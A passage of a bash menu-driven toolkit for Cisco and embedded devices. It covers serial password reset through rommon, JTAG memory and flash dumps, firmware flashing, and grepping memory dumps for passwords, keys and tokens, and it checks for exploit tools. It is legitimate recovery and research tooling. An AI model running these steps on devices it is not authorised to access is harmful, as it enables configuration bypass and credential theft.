#!/usr/bin/env bash
# Cisco & Generic Embedded Advanced Recovery Tool v3.0
#
# A TUI-based toolkit for automating password recovery, JTAG exploitation,
# JTAG cable assisted recovery, firmware modification, advanced firmware analysis,
# bootloader development, filesystem manipulation, exploit development, and live memory
# manipulation on Cisco and other embedded devices.
#
# New in v3.0: Color-coded output, dependency checker, recent files tracking,
# device address presets for ISR/ASA platforms.

# Exit on error, undefined variable, or pipe failure
set -euo pipefail

# --- Global Variables ---
# Configuration and Logging
CONFIG_FILE="~/.config/cisco_recovery/config.ini"
LOG_FILE="/var/log/cisco_recovery.log"
SESSION_DIR=""
VERBOSE=0
OPENOCD_SCRIPT_PATH="/usr/share/openocd/scripts" # Default path, can be overridden in config
# Device-specific settings
PLATFORM="auto" # 'auto', 'isr', 'asa', etc.
JTAG_ADAPTER="auto" # 'auto', 'ftdi', 'jlink', etc.
TARGET_ARCH="auto" # 'auto', 'arm', 'mips', etc.

# Recent files tracking
RECENT_FILES_LOG="$HOME/.config/cisco_recovery/recent_files.txt"
MAX_RECENT_FILES=10

# Color codes for output
if [ -t 1 ]; then
    COLOR_RESET="\033[0m"
    COLOR_RED="\033[0;31m"
    COLOR_GREEN="\033[0;32m"
    COLOR_YELLOW="\033[0;33m"
    COLOR_BLUE="\033[0;34m"
    COLOR_MAGENTA="\033[0;35m"
    COLOR_CYAN="\033[0;36m"
    COLOR_BOLD="\033[1m"
else
    COLOR_RESET=""
    COLOR_RED=""
    COLOR_GREEN=""
    COLOR_YELLOW=""
    COLOR_BLUE=""
    COLOR_MAGENTA=""
    COLOR_CYAN=""
    COLOR_BOLD=""
fi

# --- Functions ---

# Trap for cleaning up temporary files on exit
cleanup() {
    echo "Cleaning up and exiting..."
    if [ -n "$SESSION_DIR" ] && [ -d "$SESSION_DIR" ]; then
        log_message "INFO" "Removing session directory: $SESSION_DIR"
        rm -rf "$SESSION_DIR"
    fi
    # Restore terminal settings on exit
    stty echo
    exit 0
}

# Setup signal traps
trap cleanup SIGINT SIGTERM EXIT

# Load configuration from file
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        echo "Configuration loaded from $CONFIG_FILE"
    else
        echo "No configuration file found at $CONFIG_FILE. Using defaults."
    fi
}

# --- Color Output Functions ---

print_success() {
    echo -e "${COLOR_GREEN}[SUCCESS]${COLOR_RESET} $1"
}

print_error() {
    echo -e "${COLOR_RED}[ERROR]${COLOR_RESET} $1"
}

print_warning() {
    echo -e "${COLOR_YELLOW}[WARNING]${COLOR_RESET} $1"
}

print_info() {
    echo -e "${COLOR_BLUE}[INFO]${COLOR_RESET} $1"
}

print_critical() {
    echo -e "${COLOR_MAGENTA}${COLOR_BOLD}[CRITICAL]${COLOR_RESET} $1"
}

# --- Dependency Checker ---

check_dependencies() {
    print_header
    echo -e "${COLOR_CYAN}${COLOR_BOLD}=== Dependency Check ===${COLOR_RESET}"
    echo

    local missing_critical=0
    local missing_optional=0

    # Critical dependencies (core functionality)
    local critical_deps=("bash" "stty" "logger" "find" "grep" "awk" "sed" "cat")
    echo -e "${COLOR_BOLD}Critical Dependencies:${COLOR_RESET}"
    for dep in "${critical_deps[@]}"; do
        if command -v "$dep" &> /dev/null; then
            echo -e "  ${COLOR_GREEN}✓${COLOR_RESET} $dep"
        else
            echo -e "  ${COLOR_RED}✗${COLOR_RESET} $dep ${COLOR_RED}(MISSING)${COLOR_RESET}"
            missing_critical=$((missing_critical + 1))
        fi
    done

    echo
    echo -e "${COLOR_BOLD}JTAG Dependencies:${COLOR_RESET}"
    local jtag_deps=("openocd" "telnet")
    for dep in "${jtag_deps[@]}"; do
        if command -v "$dep" &> /dev/null; then
            echo -e "  ${COLOR_GREEN}✓${COLOR_RESET} $dep"
        else
            echo -e "  ${COLOR_YELLOW}○${COLOR_RESET} $dep ${COLOR_YELLOW}(optional - needed for JTAG features)${COLOR_RESET}"
            missing_optional=$((missing_optional + 1))
        fi
    done

    echo
    echo -e "${COLOR_BOLD}Firmware Analysis Dependencies:${COLOR_RESET}"
    local analysis_deps=("binwalk" "strings" "xxd" "dd" "file" "hexdump")
    for dep in "${analysis_deps[@]}"; do
        if command -v "$dep" &> /dev/null; then
            echo -e "  ${COLOR_GREEN}✓${COLOR_RESET} $dep"
        else
            echo -e "  ${COLOR_YELLOW}○${COLOR_RESET} $dep ${COLOR_YELLOW}(optional - needed for firmware analysis)${COLOR_RESET}"
            missing_optional=$((missing_optional + 1))
        fi
    done

    echo
    echo -e "${COLOR_BOLD}Filesystem Tools:${COLOR_RESET}"
    local fs_deps=("mksquashfs" "unsquashfs" "mkfs.jffs2")
    for dep in "${fs_deps[@]}"; do
        if command -v "$dep" &> /dev/null; then
            echo -e "  ${COLOR_GREEN}✓${COLOR_RESET} $dep"
        else
            echo -e "  ${COLOR_YELLOW}○${COLOR_RESET} $dep ${COLOR_YELLOW}(optional - install squashfs-tools, mtd-utils)${COLOR_RESET}"
            missing_optional=$((missing_optional + 1))
        fi
    done

    echo
    echo -e "${COLOR_BOLD}Exploit Development Tools:${COLOR_RESET}"
    local exploit_deps=("ROPgadget" "ropgadget" "msfvenom" "objdump" "readelf" "checksec")
    local found_rop=0
    for dep in "ROPgadget" "ropgadget"; do
        if command -v "$dep" &> /dev/null; then
            echo -e "  ${COLOR_GREEN}✓${COLOR_RESET} $dep"
            found_rop=1
            break
        fi
    done
    if [ $found_rop -eq 0 ]; then
        echo -e "  ${COLOR_YELLOW}○${COLOR_RESET} ROPgadget ${COLOR_YELLOW}(optional - pip install ROPgadget)${COLOR_RESET}"
        missing_optional=$((missing_optional + 1))
    fi

    for dep in "msfvenom" "objdump" "readelf" "checksec"; do
        if command -v "$dep" &> /dev/null; then
            echo -e "  ${COLOR_GREEN}✓${COLOR_RESET} $dep"
        else
            echo -e "  ${COLOR_YELLOW}○${COLOR_RESET} $dep ${COLOR_YELLOW}(optional)${COLOR_RESET}"
            missing_optional=$((missing_optional + 1))
        fi
    done

    echo
    echo "========================================="
    if [ $missing_critical -gt 0 ]; then
        print_error "Missing $missing_critical critical dependencies!"
        echo -e "${COLOR_RED}Some core features will not work.${COLOR_RESET}"
        echo
        read -r -p "Continue anyway? (yes/no): " continue_choice
        if [ "$continue_choice" != "yes" ]; then
            exit 1
        fi
    else
        print_success "All critical dependencies found!"
    fi

    if [ $missing_optional -gt 0 ]; then
        print_warning "Missing $missing_optional optional dependencies"
        echo -e "${COLOR_YELLOW}Some features will be unavailable.${COLOR_RESET}"
    else
        print_success "All optional dependencies found!"
    fi

    echo
    read -r -p "Press Enter to continue..."
}

# --- Recent Files Tracking ---

add_recent_file() {
    local file_path="$1"
    local file_type="$2"  # firmware, binary, filesystem, etc.

    # Create directory if it doesn't exist
    mkdir -p "$(dirname "$RECENT_FILES_LOG")"

    # Add entry with timestamp
    echo "$(date +%s)|$file_type|$file_path" >> "$RECENT_FILES_LOG"

    # Keep only last N entries
    tail -n "$MAX_RECENT_FILES" "$RECENT_FILES_LOG" > "${RECENT_FILES_LOG}.tmp"
    mv "${RECENT_FILES_LOG}.tmp" "$RECENT_FILES_LOG"
}

show_recent_files() {
    print_header
    echo "=== Recent Files ==="
    echo

    if [ ! -f "$RECENT_FILES_LOG" ] || [ ! -s "$RECENT_FILES_LOG" ]; then
        print_info "No recent files found."
        echo
        read -r -p "Press Enter to continue..."
        return 0
    fi

    echo "Recent files (most recent first):"
    echo

    local i=1
    local -a files=()
    local -a types=()

    # Read in reverse order (most recent first)
    while IFS='|' read -r timestamp file_type file_path; do
        if [ -f "$file_path" ]; then
            local time_str=$(date -d "@$timestamp" "+%Y-%m-%d %H:%M:%S" 2>/dev/null || date -r "$timestamp" "+%Y-%m-%d %H:%M:%S" 2>/dev/null || echo "Unknown")
            echo -e "  ${COLOR_CYAN}$i)${COLOR_RESET} [$file_type] $file_path"
            echo "      ${COLOR_BLUE}→${COLOR_RESET} $time_str"
            files+=("$file_path")
            types+=("$file_type")
            i=$((i + 1))
        fi
    done < <(tac "$RECENT_FILES_LOG")

    if [ ${#files[@]} -eq 0 ]; then
        print_warning "No valid recent files found (files may have been deleted)."
        echo
        read -r -p "Press Enter to continue..."
        return 0
    fi

    echo
    echo "  b) Back to Main Menu"
    echo
    read -r -p "Select file to work with (or 'b' to go back): " choice

    if [ "$choice" = "b" ]; then
        return 0
    fi

    if [ "$choice" -ge 1 ] && [ "$choice" -le "${#files[@]}" ]; then
        local selected_file="${files[$((choice - 1))]}"
        local selected_type="${types[$((choice - 1))]}"

        echo
        print_info "Selected: $selected_file"
        echo "Type: $selected_type"
        echo
        echo "What would you like to do?"
        echo "  1) Analyze with Firmware Analysis Suite"
        echo "  2) Extract Filesystem"
        echo "  3) Find ROP Gadgets"
        echo "  4) Scan for Vulnerabilities"
        echo "  5) Open in Firmware Workshop"
        echo "  b) Back"
        echo
        read -r -p "Choose action: " action_choice

        case "$action_choice" in
            1)
                firmware_automated_teardown
                ;;
            2)
                firmware_fs_extract
                ;;
            3)
                exploit_rop_gadget_finder
                ;;
            4)
                if [ "$selected_type" = "firmware" ]; then
                    firmware_vulnerability_scan
                else
                    exploit_buffer_overflow_detector
                fi
                ;;
            5)
                menu_firmware_workshop
                ;;
        esac
    else
        print_error "Invalid selection"
        sleep 1
    fi
}

# --- Common Address Presets ---

show_address_presets() {
    print_header
    echo "=== Common Device Address Presets ==="
    echo
    echo "Select your device platform:"
    echo
    echo -e "${COLOR_CYAN}Cisco ISR Series:${COLOR_RESET}"
    echo "  1) ISR 4000 Series (ARM)"
    echo "  2) ISR 1000 Series (ARM)"
    echo "  3) ISR 900 Series (ARM)"
    echo
    echo -e "${COLOR_CYAN}Cisco ASA Series:${COLOR_RESET}"
    echo "  4) ASA 5500-X (Intel x86)"
    echo "  5) ASA 5500 Classic (Intel x86)"
    echo
    echo -e "${COLOR_CYAN}Other Platforms:${COLOR_RESET}"
    echo "  6) Generic ARM Device"
    echo "  7) Generic MIPS Device"
    echo "  8) Custom (Manual Entry)"
    echo
    echo "  b) Back to Main Menu"
    echo
    read -r -p "Choose platform: " platform_choice

    local nvram_addr=""
    local nvram_size=""
    local flash_addr=""
    local flash_size=""
    local ram_addr=""
    local bootloader_addr=""

    case "$platform_choice" in
        1)
            print_info "ISR 4000 Series Selected"
            PLATFORM="isr"
            TARGET_ARCH="arm"
            nvram_addr="0x10000000"
            nvram_size="0x20000"
            flash_addr="0x60000000"
            flash_size="0x4000000"
            ram_addr="0x80000000"
            bootloader_addr="0x60000000"
            ;;
        2)
            print_info "ISR 1000 Series Selected"
            PLATFORM="isr"
            TARGET_ARCH="arm"
            nvram_addr="0x08000000"
            nvram_size="0x10000"
            flash_addr="0x40000000"
            flash_size="0x2000000"
            ram_addr="0x00000000"
            bootloader_addr="0x40000000"
            ;;
        3)
            print_info "ISR 900 Series Selected"
            PLATFORM="isr"
            TARGET_ARCH="arm"
            nvram_addr="0x10000000"
            nvram_size="0x20000"
            flash_addr="0x44000000"
            flash_size="0x2000000"
            ram_addr="0x00000000"
            bootloader_addr="0x44000000"
            ;;
        4)
            print_info "ASA 5500-X Selected"
            PLATFORM="asa"
            TARGET_ARCH="x86"
            nvram_addr="0xF0000000"
            nvram_size="0x10000"
            flash_addr="0xFFC00000"
            flash_size="0x400000"
            ram_addr="0x00000000"
            bootloader_addr="0xFFFE0000"
            ;;
        5)
            print_info "ASA 5500 Classic Selected"
            PLATFORM="asa"
            TARGET_ARCH="x86"
            nvram_addr="0xF0000000"
            nvram_size="0x8000"
            flash_addr="0xFFF00000"
            flash_size="0x100000"
            ram_addr="0x00000000"
            bootloader_addr="0xFFFF0000"
            ;;
        6)
            print_info "Generic ARM Device Selected"
            PLATFORM="auto"
            TARGET_ARCH="arm"
            nvram_addr="0x10000000"
            nvram_size="0x10000"
            flash_addr="0x08000000"
            flash_size="0x1000000"
            ram_addr="0x20000000"
            bootloader_addr="0x08000000"
            ;;
        7)
            print_info "Generic MIPS Device Selected"
            PLATFORM="auto"
            TARGET_ARCH="mips"
            nvram_addr="0x1FC00000"
            nvram_size="0x10000"
            flash_addr="0x1E000000"
            flash_size="0x1000000"
            ram_addr="0x80000000"
            bootloader_addr="0x1FC00000"
            ;;
        8)
            print_info "Custom Address Configuration"
            echo
            read -r -p "Enter NVRAM address (hex, e.g., 0x10000000): " nvram_addr
            read -r -p "Enter NVRAM size (hex, e.g., 0x20000): " nvram_size
            read -r -p "Enter Flash address (hex): " flash_addr
            read -r -p "Enter Flash size (hex): " flash_size
            read -r -p "Enter RAM address (hex): " ram_addr
            read -r -p "Enter Bootloader address (hex): " bootloader_addr
            ;;
        b)
            return 0
            ;;
        *)
            print_error "Invalid selection"
            sleep 1
            return 1
            ;;
    esac

    echo
    print_success "Address Preset Loaded!"
    echo
    echo -e "${COLOR_BOLD}Memory Map:${COLOR_RESET}"
    echo -e "  ${COLOR_GREEN}NVRAM:${COLOR_RESET}      $nvram_addr (size: $nvram_size)"
    echo -e "  ${COLOR_GREEN}Flash:${COLOR_RESET}      $flash_addr (size: $flash_size)"
    echo -e "  ${COLOR_GREEN}RAM:${COLOR_RESET}        $ram_addr"
    echo -e "  ${COLOR_GREEN}Bootloader:${COLOR_RESET} $bootloader_addr"
    echo
    echo -e "${COLOR_BOLD}Configuration:${COLOR_RESET}"
    echo -e "  Platform: ${COLOR_CYAN}$PLATFORM${COLOR_RESET}"
    echo -e "  Architecture: ${COLOR_CYAN}$TARGET_ARCH${COLOR_RESET}"
    echo
    echo "These addresses are now available for:"
    echo "  - Memory Poke/Peek operations"
    echo "  - Firmware dumping"
    echo "  - NVRAM extraction"
    echo "  - Bootloader recovery"
    echo
    echo "Would you like to save this as a configuration profile?"
    read -r -p "(yes/no): " save_choice

    if [ "$save_choice" = "yes" ]; then
        read -r -p "Enter profile name: " profile_name
        config_save_profile
    fi

    echo
    read -r -p "Press Enter to continue..."
}

# --- Utility Functions ---

# Prints a standardized header for TUI menus
print_header() {
    clear
    echo "================================================="
    echo "  Cisco & Generic Embedded Advanced Recovery Tool"
    echo "================================================="
    echo
}

# Logs a message to the LOG_FILE with a timestamp
log_message() {
    local type="$1"
    local message="$2"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$type] $message" | tee -a "$LOG_FILE"
    if [ "$VERBOSE" -eq 1 ] && [ "$type" != "DEBUG" ]; then
        echo "[$timestamp] [$type] $message"
    fi
}

# --- Core Logic & Menus ---

detect_platform_auto() {
    log_message "INFO" "Starting platform auto-detection."
    echo "Analyzing system logs for known serial devices..."

    # Check dmesg for FTDI serial converters, often used for Cisco consoles
    if dmesg | grep -q "FTDI USB Serial Device converter now attached"; then
        # Check for strings that might indicate a specific Cisco device type
        # This is a heuristic and might need to be adjusted
        if dmesg | grep -q "ISR"; then
            PLATFORM="isr"
            log_message "INFO" "Heuristic match: Cisco ISR detected via dmesg."
            echo "Platform detected: Cisco ISR (heuristic)"
        elif dmesg | grep -q "ASA"; then
            PLATFORM="asa"
            log_message "INFO" "Heuristic match: Cisco ASA detected via dmesg."
            echo "Platform detected: Cisco ASA (heuristic)"
        else
            PLATFORM="unknown_cisco"
            log_message "INFO" "Generic Cisco-like serial device detected."
            echo "Generic Cisco serial device detected."
        fi
    else
        log_message "WARN" "No known Cisco serial device was automatically detected."
        echo "No known Cisco device found. Please set it manually."
    fi
    sleep 2
}

detect_platform() {
    while true; do
        print_header
        echo "--- Platform Detection ---"
        echo "  Current Platform: $PLATFORM"
        echo
        echo "  1) Auto-detect Platform"
        echo "  2) Set to Cisco ISR"
        echo "  3) Set to Cisco ASA"
        echo "  4) Set to Nortel Switch"
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) detect_platform_auto ;;
            2) PLATFORM="isr" ;;
            3) PLATFORM="asa" ;;
            4) PLATFORM="nortel" ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

detect_jtag_adapter_auto() {
    log_message "INFO" "Starting JTAG adapter auto-detection."
    echo "Scanning USB devices for known JTAG adapters..."

    if lsusb -d 0403:6010; then
        JTAG_ADAPTER="ftdi"
        log_message "INFO" "FTDI adapter (FT2232/FT4232) detected."
        echo "Adapter detected: FTDI"
    elif lsusb -d 1366:0101; then
        JTAG_ADAPTER="jlink"
        log_message "INFO" "SEGGER J-Link adapter detected."
        echo "Adapter detected: J-Link"
    elif lsusb -d 1a86:7523; then
        JTAG_ADAPTER="ch341"
        log_message "INFO" "CH341 adapter detected."
        echo "Adapter detected: CH341"
    else
        log_message "WARN" "No known JTAG adapter was automatically detected."
        echo "No known adapter found. Please set it manually."
    fi
    sleep 2
}

detect_jtag_adapter() {
    while true; do
        print_header
        echo "--- JTAG Adapter Detection ---"
        echo "  Current Adapter: $JTAG_ADAPTER"
        echo
        echo "  1) Auto-detect Adapter"
        echo "  2) Set to FTDI (e.g., FT232H)"
        echo "  3) Set to J-Link"
        echo "  4) Set to CH341"
        echo "  b) Back"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) detect_jtag_adapter_auto ;;
            2) JTAG_ADAPTER="ftdi" ;;
            3) JTAG_ADAPTER="jlink" ;;
            4) JTAG_ADAPTER="ch341" ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}


recover_cisco_password() {
    print_header
    echo "--- Cisco Password Recovery ---"

    if ! command -v expect &> /dev/null; then
        log_message "ERROR" "'expect' command not found. This feature cannot run."
        echo "ERROR: 'expect' is required for this feature but is not installed."
        echo "Please install 'expect' (e.g., 'sudo apt-get install expect') and try again."
        sleep 4
        return
    fi

    local serial_device
    read -r -p "Enter the serial device path (e.g., /dev/ttyUSB0): " serial_device
    if [ ! -c "$serial_device" ]; then
        log_message "ERROR" "Serial device not found at '$serial_device'."
        echo "ERROR: Character device not found at '$serial_device'."
        sleep 2
        return
    fi

    log_message "INFO" "Starting password recovery on $serial_device for platform $PLATFORM."

    local expect_script
    expect_script=$(mktemp)

    # Create the expect script
    cat > "$expect_script" <<- EOL
        #!/usr/bin/expect -f
        set timeout 30
        set serial_port "$serial_device"

        # Configure the serial port
        stty -F \$serial_port 9600 raw -echo

        spawn screen \$serial_port 9600

        puts "---"
        puts "Please power-cycle the target device now."
        puts "The script will send a BREAK signal in 15 seconds."
        puts "---"
        sleep 15

        # In screen, the BREAK signal is Ctrl-A, Ctrl-B
        send "\\001"
        sleep 0.1
        send "b"

        expect {
            "rommon 1 >" {
                send "confreg 0x2142\\r"
            }
            timeout {
                puts "Timed out waiting for rommon prompt. Recovery failed."
                exit 1
            }
        }

        expect "rommon 2 >"
        send "reset\\r"

        expect eof
EOL

    chmod +x "$expect_script"

    echo "Launching recovery script. Please follow the prompts."
    sleep 2

    # Run the expect script in the current terminal
    "$expect_script"

    log_message "INFO" "Password recovery script finished."
    echo "Recovery process complete. The device will reboot and bypass the startup-config."
    echo "You can now configure a new password."

    rm "$expect_script"
    read -r -p "Press Enter to continue..."
}

menu_password_recovery() {
    while true; do
        print_header
        echo "--- Cisco Password Recovery ---"
        echo "  Current Platform: $PLATFORM"
        echo
        echo "  1) Initiate Password Reset (ISR/ASA)"
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) recover_cisco_password ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

exploit_via_jtag() {
    local action="$1"
    print_header
    echo "--- JTAG Exploitation: ${action} ---"

    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found, which is required for JTAG."
        echo "ERROR: 'openocd' is not installed. Please install it to use this feature."
        sleep 3
        return
    fi
    if [ "$JTAG_ADAPTER" == "auto" ] || [ "$TARGET_ARCH" == "auto" ]; then
        log_message "ERROR" "JTAG adapter or target architecture not set."
        echo "ERROR: Please configure the JTAG adapter and target architecture first."
        sleep 3
        return
    fi

    local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
    # NOTE: This is a simplification. Real-world targets often need highly specific scripts.
    local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

    local output_file
    local openocd_cmd

    case "$action" in
        "scan")
            openocd_cmd=("openocd" "-f" "$ocd_interface_cfg" "-f" "$ocd_target_cfg" "-c" "init" "-c" "jtag_scan" "-c" "exit")
            ;;
        "dump_ram")
            read -r -p "Enter output file path for RAM dump (e.g., /tmp/ram.bin): " output_file
            read -r -p "Enter memory address to dump from (hex): " mem_addr
            read -r -p "Enter size to dump (bytes): " mem_size
            openocd_cmd=("openocd" "-f" "$ocd_interface_cfg" "-f" "$ocd_target_cfg" "-c" "init" "-c" "halt" "-c" "dump_image \"$output_file\" $mem_addr $mem_size" "-c" "resume" "-c" "exit")
            ;;
        "extract_flash")
            read -r -p "Enter output file path for flash dump (e.g., /tmp/flash.bin): " output_file
            # This is highly target-specific. The command below is a generic example.
            openocd_cmd=("openocd" "-f" "$ocd_interface_cfg" "-f" "$ocd_target_cfg" "-c" "init" "-c" "halt" "-c" "flash read_bank 0 \"$output_file\" 0 0" "-c" "resume" "-c" "exit")
            ;;
        *)
            log_message "ERROR" "Unknown JTAG action requested: $action"
            echo "Internal error: Unknown action '$action'."
            sleep 2
            return
            ;;
    esac

    log_message "INFO" "Executing JTAG action: $action"
    echo "Executing OpenOCD command... Check log for detailed output."
    log_message "CMD" "${openocd_cmd[*]}"

    if ! output=$("${openocd_cmd[@]}" 2>&1); then
        log_message "ERROR" "OpenOCD command failed. Output: $output"
        echo "ERROR: OpenOCD command failed. See log at $LOG_FILE for details."
        sleep 3
    else
        log_message "INFO" "OpenOCD action '$action' successful. Output: $output"
        echo "SUCCESS: JTAG action '$action' completed."
        sleep 3
    fi
}

menu_jtag_exploitation() {
    while true; do
        print_header
        echo "--- JTAG Exploitation ---"
        echo "  Current Adapter: $JTAG_ADAPTER"
        echo "  Current Architecture: $TARGET_ARCH"
        echo
        echo "  1) Scan JTAG Chain"
        echo "  2) Dump Memory (RAM)"
        echo "  3) Extract Firmware (Flash)"
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) exploit_via_jtag "scan" ;;
            2) exploit_via_jtag "dump_ram" ;;
            3) exploit_via_jtag "extract_flash" ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}
analyze_memory_dump() {
    local action="$1"
    print_header
    echo "--- Memory Dump Analysis: ${action} ---"

    read -r -p "Enter the path to the memory dump file: " dump_file
    if [ ! -f "$dump_file" ]; then
        log_message "ERROR" "Memory dump file not found at '$dump_file'."
        echo "ERROR: File not found at '$dump_file'."
        sleep 2
        return
    fi

    log_message "INFO" "Starting memory analysis ('$action') on file $dump_file."
    echo "Analyzing file... This may take a moment."

    local report_file="${SESSION_DIR}/memory_analysis_report.txt"
    echo "Analysis Report for $dump_file" > "$report_file"
    echo "Type: $action" >> "$report_file"
    echo "========================================" >> "$report_file"

    case "$action" in
        "credentials")
            echo "Searching for potential credentials (passwords, keys, etc.)..."
            {
                echo -e "\n--- Potential Credentials ---\n"
                strings "$dump_file" | grep -iE 'password|secret|apikey|privatekey|token'
            } >> "$report_file"
            ;;
        "bootloader")
            echo "Scanning for common bootloader signatures..."
            {
                echo -e "\n--- Bootloader Signatures ---\n"
                # U-Boot
                if hexdump -C "$dump_file" | grep -q '27 05 19 56'; then
                    echo "U-Boot signature (27 05 19 56) found."
                fi
                # CFE
                if strings "$dump_file" | grep -q "CFE boot loader"; then
                    echo "CFE bootloader string found."
                fi
            } >> "$report_file"
            ;;
        *)
            log_message "ERROR" "Unknown memory analysis action: $action"
            echo "Internal error: Unknown action '$action'."
            sleep 2
            return
            ;;
    esac

    log_message "INFO" "Memory analysis complete. Report generated at $report_file."
    echo "Analysis complete. Displaying report:"
    echo "---------------------------------------"
    cat "$report_file"
    echo "---------------------------------------"
    echo "Full report saved to $report_file"
    read -r -p "Press Enter to continue..."
}

menu_memory_analysis() {
    while true; do
        print_header
        echo "--- Memory Analysis ---"
        echo "  1) Analyze Memory Dump for Credentials"
        echo "  2) Scan for Bootloader Signatures"
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) analyze_memory_dump "credentials" ;;
            2) analyze_memory_dump "bootloader" ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

jtag_flash_write() {
    print_header
    echo "--- JTAG Flash Write (DANGEROUS) ---"
    echo
    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    echo "  WARNING: THIS IS AN EXTREMELY DANGEROUS OPERATION."
    echo "  Writing the wrong firmware can permanently brick your device."
    echo "  You assume all risk. Double-check your settings."
    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    echo
    echo "  - Target Platform: $PLATFORM"
    echo "  - JTAG Adapter:    $JTAG_ADAPTER"
    echo "  - Target Arch:     $TARGET_ARCH"
    echo

    read -r -p "Type 'confirm' to proceed: " confirmation
    if [[ "$confirmation" != "confirm" ]]; then
        log_message "INFO" "JTAG flash write cancelled by user."
        echo "Flash write cancelled."
        sleep 2
        return
    fi

    read -r -p "Enter the full path to the firmware image (.bin): " firmware_path
    if [ ! -f "$firmware_path" ]; then
        log_message "ERROR" "JTAG flash write failed: file not found at '$firmware_path'."
        echo "ERROR: Firmware file not found at '$firmware_path'."
        sleep 2
        return
    fi

    log_message "INFO" "Starting JTAG flash write for firmware: $firmware_path."
    echo "Preparing to flash. This is your final chance to abort."
    echo "Press Ctrl+C to cancel, or Enter to continue..."
    read -r

    local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
    # This is still a simplification; a real target may need a more specific file.
    local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

    if [ ! -f "$ocd_interface_cfg" ] || [ ! -f "$ocd_target_cfg" ]; then
        log_message "ERROR" "OpenOCD config files not found. Check OPENOCD_SCRIPT_PATH."
        echo "ERROR: OpenOCD config files not found. Searched in '$OPENOCD_SCRIPT_PATH'."
        sleep 3
        return
    fi

    local openocd_cmd=(
        "openocd"
        "-f" "$ocd_interface_cfg"
        "-f" "$ocd_target_cfg"
        "-c" "init"
        "-c" "halt"
        # The 'program' command is a high-level abstraction that handles erasing, writing, and verifying.
        "-c" "program \"$firmware_path\" verify reset exit"
    )

    log_message "CMD" "${openocd_cmd[*]}"
    echo "Executing OpenOCD. The device will be flashed and reset. See log for details."

    if ! output=$("${openocd_cmd[@]}" 2>&1); then
        log_message "ERROR" "OpenOCD flash write failed. Output: $output"
        echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
        echo "   ERROR: OPENOCD COMMAND FAILED."
        echo "   The device may be in an inconsistent state."
        echo "   See log at $LOG_FILE for details."
        echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
        read -r -p "Press Enter to return to the menu..."
    else
        log_message "INFO" "OpenOCD flash write successful. Output: $output"
        echo "---"
        echo " SUCCESS: Flash write completed and verified."
        echo " The device has been reset."
        echo "---"
        read -r -p "Press Enter to continue..."
    fi
}

menu_firmware_manipulation() {
    while true; do
        print_header
        echo "--- Firmware Manipulation ---"
        echo "  1) Extract Firmware (JTAG)"
        echo "  2) Flash Image to Device (DANGEROUS)"
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) exploit_via_jtag "extract_flash" ;;
            2) jtag_flash_write ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- JTAG Cable Assisted Recovery Functions ---

jtag_test_connection() {
    print_header
    echo "--- JTAG Cable Connection Test ---"
    echo

    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found."
        echo "ERROR: 'openocd' is not installed. Please install it to use this feature."
        sleep 3
        return
    fi

    if [ "$JTAG_ADAPTER" == "auto" ]; then
        log_message "ERROR" "JTAG adapter not set."
        echo "ERROR: Please configure the JTAG adapter first."
        sleep 3
        return
    fi

    local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"

    if [ ! -f "$ocd_interface_cfg" ]; then
        log_message "ERROR" "OpenOCD interface config not found: $ocd_interface_cfg"
        echo "ERROR: Interface config file not found. Check OPENOCD_SCRIPT_PATH."
        sleep 3
        return
    fi

    echo "Testing JTAG cable connection..."
    echo "Adapter: $JTAG_ADAPTER"
    echo

    local openocd_cmd=(
        "openocd"
        "-f" "$ocd_interface_cfg"
        "-c" "adapter speed 1000"
        "-c" "init"
        "-c" "scan_chain"
        "-c" "exit"
    )

    log_message "INFO" "Running JTAG connection test..."
    log_message "CMD" "${openocd_cmd[*]}"

    local test_output
    if test_output=$("${openocd_cmd[@]}" 2>&1); then
        log_message "INFO" "JTAG connection test output: $test_output"
        echo "------- Connection Test Results -------"
        echo "$test_output" | grep -E "(Info|Error|Warn|JTAG|TAP)" || echo "$test_output"
        echo "---------------------------------------"

        if echo "$test_output" | grep -q "JTAG tap:"; then
            echo
            echo "SUCCESS: JTAG TAP detected! Cable connection is working."
        else
            echo
            echo "WARNING: No JTAG TAP detected. Check your connections."
        fi
    else
        log_message "ERROR" "JTAG connection test failed: $test_output"
        echo "ERROR: Connection test failed. Output:"
        echo "$test_output"
    fi

    echo
    read -r -p "Press Enter to continue..."
}

jtag_detect_taps() {
    print_header
    echo "--- JTAG TAP Detection & Diagnostics ---"
    echo

